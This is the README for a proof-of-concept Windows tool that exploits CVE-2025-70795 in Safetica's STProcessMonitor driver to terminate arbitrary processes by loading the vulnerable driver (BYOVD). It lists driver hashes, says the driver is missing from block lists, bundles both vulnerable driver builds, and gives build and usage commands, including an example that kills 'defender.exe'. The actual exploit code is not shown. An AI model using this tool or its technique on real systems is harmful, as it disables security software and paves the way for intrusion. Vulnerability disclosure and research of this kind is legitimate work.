# STProcessMonitor-Killer
- PoC for CVE-2025-70795 vulnerability in STProcessMonitor Driver from Safetica
- Affects:
  - **Legacy builds (11.11.4.0)** -> low-privilege BYOVD abuse
  - **Current build (11.26.18.0)** -> LocalSystem-privilege BYOVD abuse

- As of 2026-02-12, the driver is **not** listed on [LOLDDrivers](https://www.loldrivers.io/) or in [Microsoft's recommended driver block rules](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/design/microsoft-recommended-driver-block-rules)

Built on [`byovd-lib`](../byovd-lib/) -- implements the `DriverConfig` trait and delegates the full BYOVD flow to the shared library. Version 2618 requires LocalSystem privileges (enforced via `preflight_check`).

**Driver hashes:**
- `STProcessMonitor.sys` **11.11.4.0** SHA256: `70bcec00c215fe52779700f74e9bd669ff836f594df92381cbfb7ee0568e7a8b`
- `STProcessMonitor.sys` **11.26.18.0** SHA256: `5b4f59236a9b950bcd5191b35d19125f60cfb9e1a1e1aa2e4f914b6745dde9df`

## Usage

Both driver versions are included:
- `STProcessMonitor_v114.sys` — version 11.11.4.0 (low-privilege)
- `STProcessMonitor_v2618.sys` — version 11.26.18.0 (requires LocalSystem)

Select the driver version with the `--version` flag:

```bash
# Build
cargo build --release -p STProcessMonitor-Killer
```

```text
PS C:\Users\User\Desktop> .\STProcessMonitor-Killer.exe -h
BYOVD process killer using STProcessMonitor driver (CVE-2025-70795)

Usage: STProcessMonitor-Killer.exe --name <PROCESS_NAME> --version <DRIVER_VERSION>

Options:
  -n, --name <PROCESS_NAME>         Target process name (e.g., notepad.exe)
  -v, --version <DRIVER_VERSION>    Driver version: 114 (v11.11.4, low-priv) or 2618 (v11.26.18, LocalSystem)
  -d, --driver <DRIVER_PATH>        Custom driver file path (overrides default)
  -h, --help                        Print help
  -V, --version                     Print version

EXAMPLES:
  STProcessMonitor-Killer.exe --version 114 -n notepad.exe
  STProcessMonitor-Killer.exe --version 2618 -n defender.exe
```
